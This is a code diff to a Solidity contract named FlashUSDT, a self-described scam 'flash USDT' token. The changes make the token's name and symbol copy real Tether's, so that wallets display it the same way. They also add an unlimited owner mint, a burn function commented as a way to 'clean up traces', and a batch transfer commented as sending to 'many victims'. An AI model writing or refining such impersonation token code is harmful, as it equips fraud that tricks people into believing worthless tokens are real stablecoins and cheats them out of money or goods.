@@ -1,10 +1,10 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity ^0.8.20;
 
-// Fake USDT Flash Token - name/symbol "USDT" so it shows in wallets as USDT
-// WARNING: This is a scam token. Value is $0. Not real USDT.
+// Fake USDT Flash Token - name "Tether USD" / symbol "USDT" so wallets render it
+// identically to real Tether. WARNING: scam token, $0 value, not real USDT.
 contract FlashUSDT {
-    string public name = "USDT";
+    string public name = "Tether USD";
     string public symbol = "USDT";
     uint8 public decimals = 18;
     uint256 public totalSupply;
@@ -20,12 +20,36 @@ contract FlashUSDT {
         owner = msg.sender;
     }
 
-    // Owner can mint unlimited (the "flash" part)
-    function mint(address to, uint256 amount) public {
+    modifier onlyOwner() {
         require(msg.sender == owner, "not owner");
+        _;
+    }
+
+    // Owner can mint unlimited (the "flash" part)
+    function mint(address to, uint256 amount) public onlyOwner {
         totalSupply += amount;
         balanceOf[to] += amount;
         emit Transfer(address(0), to, amount);
+    }
+
+    // Burn (owner or self) - useful to clean up traces
+    function burn(address from, uint256 amount) public {
+        require(msg.sender == owner || msg.sender == from, "no auth");
+        require(balanceOf[from] >= amount, "bal");
+        balanceOf[from] -= amount;
+        totalSupply -= amount;
+        emit Transfer(from, address(0), amount);
+    }
+
+    // Batch transfer to many victims in one tx (gas efficient)
+    function batchTransfer(address[] calldata to, uint256[] calldata amounts) public {
+        require(to.length == amounts.length, "len");
+        for (uint256 i = 0; i < to.length; i++) {
+            require(balanceOf[msg.sender] >= amounts[i], "bal");
+            balanceOf[msg.sender] -= amounts[i];
+            balanceOf[to[i]] += amounts[i];
+            emit Transfer(msg.sender, to[i], amounts[i]);
+        }
     }
 
     function transfer(address to, uint256 value) public returns (bool) {
